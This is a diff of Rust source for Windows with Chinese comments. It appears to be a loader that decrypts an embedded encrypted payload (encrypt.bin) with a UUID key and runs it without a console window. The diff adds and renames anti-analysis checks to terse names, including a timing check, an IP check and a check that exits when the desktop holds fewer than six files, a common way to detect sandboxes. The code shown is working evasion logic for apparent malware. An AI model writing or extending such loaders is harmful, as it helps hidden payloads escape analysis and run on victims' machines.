@@ -14,8 +14,11 @@ use windows_sys::Win32::System::Threading::GetCurrentThread;
 use std::os::windows::process::CommandExt;
 use winapi::um::winbase::CREATE_NO_WINDOW;
 
-use std::fs;  //桌面文件
+use std::fs;
 use std::path::PathBuf;
+use std::process;
+
+
 
 
 fn decrypt_with_uuid(data: &[u8], uuid: &uuid::Uuid) -> Vec<u8> {
@@ -28,7 +31,7 @@ fn decrypt_with_uuid(data: &[u8], uuid: &uuid::Uuid) -> Vec<u8> {
     decrypted_data
 }
 
-pub fn flow_time() {
+pub fn ft() {
     use std::time::{Duration, Instant};
     use std::thread::sleep;
 
@@ -63,38 +66,40 @@ fn ip() {
     }
 }
 
-fn check_desktop() {
+fn cdp() {
+    if !check_desktop_files() {
+        process::exit(1);
+    }
+}
+
+fn check_desktop_files() -> bool {
     // 获取桌面路径
-    let desktop_path = get_desktop_path().expect("无法获取桌面路径");
+    let desktop_path = match get_desktop_path() {
+        Some(path) => path,
+        None => return false,
+    };
 
     let entries = match fs::read_dir(&desktop_path) {
         Ok(entries) => entries,
-        Err(_) => {
-            
-            std::process::exit(1);
-        }
+        Err(_) => return false,
     };
 
     let file_count = entries.filter_map(|entry| entry.ok()).count();
 
-    // 检查文件数量是否小于 10
-    if file_count < 6 {
-        std::process::exit(1);
-    } else {
-    }
+    // 检查文件数量是否小于 6
+    file_count >= 6
 }
 
 fn get_desktop_path() -> Option<PathBuf> {
     let home_dir = dirs::home_dir()?;
-    #[cfg(target_os = "windows")]
-    return Some(home_dir.join("Desktop"));
-    None
+    Some(home_dir.join("Desktop"))
 }
 
+
 fn main() {
-    flow_time();
     ip();
-    check_desktop();
+    ft();
+    cdp();
     //forgery::bundle::bundlefile();
     let encrypted_data = include_bytes!("encrypt.bin");
     let uuid_bytes = include_bytes!("uuidkey.txt");
